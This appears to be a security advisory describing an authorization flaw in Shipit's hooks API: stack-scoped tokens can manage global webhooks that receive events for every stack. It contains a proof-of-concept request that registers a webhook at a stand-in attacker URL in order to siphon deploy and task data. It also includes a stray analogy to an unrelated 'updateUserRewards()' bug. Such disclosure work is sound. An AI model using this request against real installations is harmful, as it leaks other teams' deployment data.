### Title
Stack-scoped API tokens can create/manage global webhooks, exfiltrating deploy/task data for every stack - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
`Api::HooksController` scopes hooks to a stack only via the presence of a `params[:stack_id]` path segment, not via the requesting `ApiClient`'s own `stack_id` restriction. Because the top-level route `resources :hooks` (mounted outside the `/stacks/*stack_id` scope) never sets `params[:stack_id]`, any `ApiClient` holding the `write:hook` permission — even one that is supposed to be restricted to a single stack via `ApiClient#stack_id` — can call this unscoped endpoint to create, read, update, or delete **global** hooks (`stack_id: nil`), which receive delivery events for every stack in the installation.

### Finding Description
`Api::BaseController` enforces the "stack a token authorizes" binding for ordinary stack-scoped resources through the `stacks` helper: [1](#0-0) 

Any controller that fetches its resource via `stack` (backed by `stacks.from_param!`) is therefore correctly restricted: if `current_api_client.stack_id?` is true, only that one stack is visible.

`Api::HooksController`, however, does not derive its query from `stacks`/`stack` at all. It builds the hook scope directly from the raw path parameter: [2](#0-1) 

`require_permission :write, :hook` only checks the `ApiClient#permissions` array — it has no relationship to `ApiClient#stack_id`: [3](#0-2) 

The route table mounts `Api::HooksController` twice: once nested under a specific stack (`/api/stacks/*stack_id/hooks`) and once at the top level (`/api/hooks`), with the top-level route taking priority for the `id`-only path: [4](#0-3) 

When the top-level route is used, `params[:stack_id]` is absent, so `stack_id` (the private helper) evaluates to `nil`, and `hooks` becomes `Hook.where(stack_id: nil)` — i.e. the set of **global** hooks that Shipit fires for every stack's `stack`, `task`, `deploy`, `rollback`, `lock`, `commit_status`, `deployable_status`, `merge_status`, `merge`, and `pull_request` events: [5](#0-4) 

The test suite explicitly documents this design: the top-level route "has priority" and `#index` without a `stack_id` "returns the list of global hooks": [6](#0-5) 

The bug-class analogy to the reported `updateUserRewards()` issue is direct: in the original bug, a method that should only ever act on the caller's own accumulated balance instead accepted an arbitrary target `user` argument with no check that the caller was authorized for that specific account, silently overwriting data belonging to someone else. Here, a method that should only ever act on hooks belonging to the caller's own authorized stack (`ApiClient#stack_id`) instead derives its scope purely from an easily-avoidable URL shape (`params[:stack_id]` presence), with no check tying the created/read/updated/destroyed `Hook` back to the `ApiClient#stack_id` binding. The equality that should hold — `hook_scope == ApiClient#stack_id`'s authorized stack — is broken to `hook_scope == params[:stack_id] presence`, an attacker-controlled/avoidable value, once the top-level `/api/hooks` route is used instead of the nested one.

### Impact Explanation
An `ApiClient` that was intentionally issued scoped to a single stack (e.g., created via `CCMenuUrlController#client` with `stack_id` set, or any admin-issued token meant to be restricted to one repo/environment) but which also carries `write:hook`/`read:hook` permissions can:
- Read the full list and delivery URLs/secrets configuration of all **global** hooks (`GET /api/hooks`), which are not restricted to the stacks the token is supposed to see.
- Create a new global hook (`POST /api/hooks`) pointing at an attacker-controlled URL, causing Shipit to deliver `stack`, `task`, `deploy`, `rollback`, `lock`, `commit_status`, `merge` and `pull_request` event payloads — including task output links, deploy status, and stack metadata — for **every** stack in the installation, not just the stack the token was scoped to.
- Update or delete existing global hooks belonging to the whole installation, disrupting notification delivery for unrelated teams/stacks.

This amounts to an unauthenticated (relative to the token's actual authorization) read of stack state and task/deploy output for stacks the token was never granted access to, which matches the in-scope "High" impact category (escalation into cross-stack read of stack state / task streams / deploy output).

### Likelihood Explanation
Exploitation requires only possession of any valid `ApiClient` Basic-Auth token that has `write:hook` (or `read:hook`) permission, regardless of whether that token's `stack_id` is set to restrict it to one stack. No GitHub App credentials, webhook secret, or elevated Shopify/Shipit-team membership are needed — only a standard API client credential, which is the intended and common way for automation to interact with Shipit. Because the vulnerable route (`/api/hooks`) is the top-level, higher-priority route documented and tested as the "global hooks" entry point, the misuse is a one-line difference from the intended, permitted usage (simply omitting the `stack_id` path segment), making accidental or deliberate misuse highly likely for any token that has hook permissions.

### Recommendation
`Api::HooksController` should intersect its `hooks` scope with the stack(s) actually authorized for `current_api_client`, mirroring the `stacks`/`stack` helpers in `BaseController`. Concretely: if `current_api_client.stack_id?` is true, the controller should reject (403/404) any request that resolves to `stack_id: nil` (global) hooks, and should always scope through `stacks` rather than through raw `params[:stack_id]` presence, so the create/read/update/destroy actions can never touch hooks (global or otherwise) outside the stack bound to the token.

### Proof of Concept
1. Create an `ApiClient` scoped to `stack: shipit` with `permissions: ['write:hook']` (analogous to the `here_come_the_walrus` fixture but with hook permissions added), simulating a token an admin intends to restrict to a single stack.
2. Authenticate with that token and call the top-level route rather than the nested one:
   ```
   POST /api/hooks
   Authorization: Basic <scoped-token>
   { "delivery_url": "https://attacker.example.com/collect", "events": ["deploy", "task", "commit_status"] }
   ```
3. Because `Api::HooksController#hooks` resolves to `Hook.where(stack_id: nil)` (global hooks) rather than being filtered through `current_api_client.stack_id`, the request succeeds and a global hook is created.
4. Any subsequent `deploy`, `task`, `commit_status`, etc. event on **any** stack in the installation — not just the one the token was authorized for — is now delivered to `https://attacker.example.com/collect`, as shown by `Hook.deliver` iterating `for_stack(stack_id)` which always includes global (`stack_id: nil`) hooks: [7](#0-6) .
